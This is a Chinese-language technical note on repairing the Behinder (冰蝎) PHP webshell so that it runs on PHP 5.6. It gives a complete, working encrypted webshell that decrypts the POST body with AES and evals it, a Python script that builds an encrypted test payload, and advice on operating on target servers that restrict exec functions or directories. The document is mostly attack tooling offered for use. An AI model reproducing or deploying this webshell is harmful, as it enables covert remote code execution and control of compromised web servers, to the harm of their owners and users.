## 问题
冰蝎官方 PHP 马（以及几乎所有网上流传的版本）用：
    $post = openssl_decrypt($post, "AES128", $key);
在 PHP 5.6.40 上这句**静默失败**：
    var_dump(openssl_decrypt($b64cipher,"AES128","f7291f56973a38b4"));
    → bool(false)
    openssl_error_string() → 'error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt'
    in_array("AES128", openssl_get_cipher_methods()) → false
    in_array("AES-128-ECB", openssl_get_cipher_methods()) → true
结果：$post=false → explode('|',false)=[''] → $params=null → eval(null) 无输出 →
**马返回 200 但响应体长度 0，客户端表现为"连接失败/超时"**，极易被误判成"马没上传成功"。

## 修复
只把 cipher 名从 "AES128" 改成 "aes-128-ecb"（或 "AES-128-ECB"）即可：
    $post = openssl_decrypt($post, "aes-128-ecb", $key);
**冰蝎客户端侧完全无感知** —— 客户端始终发送
base64( AES-128-ECB + PKCS5/7 + key=md5(pass)[0:16] ) 的密文，马内部用什么名字解密是马的事。

## 可用马（PHP 5.6 / Nginx / fpm-fcgi 实测通过）
<?php
@error_reporting(0);
session_start();
$key="<md5(pass)[0:16]>";
$_SESSION['k']=$key;
session_write_close();
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
	$t="base64_"."decode";
	$post=$t($post."");
	for($i=0;$i<strlen($post);$i++) {
		$post[$i] = $post[$i]^$key[$i+1&15];
	}
}
else
{
	$post=openssl_decrypt($post, "aes-128-ecb", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>
（生成 key：python -c "import hashlib;print(hashlib.md5(b'你的密码').hexdigest()[:16])"）

## 自测（不装冰蝎也能验证连通）
from Crypto.Cipher import AES; import base64, hashlib
key = hashlib.md5(b'jbg2026').hexdigest()[:16]
def enc(p):
    pad = 16 - len(p) % 16
    return AES.new(key.encode(), AES.MODE_ECB).encrypt(p + bytes([pad])*pad)
body = base64.b64encode(enc(b'test|echo "BEHINDER_OK";')).decode()
# POST body 作为 raw body（Content-Type: application/x-www-form-urlencoded）
# 期望响应：BEHINDER_OK

## 目标环境注意
- 若目标 disable_functions 禁了 passthru/exec/system/shell_exec/popen/proc_open，
  冰蝎里执行系统命令会返回空 —— 这不是马坏了，是命令执行被禁；
  改用 PHP 原生能力（file_get_contents/scandir/mysqli/curl）继续操作。
- 若 open_basedir 限制了目录，文件浏览只能在其允许路径内。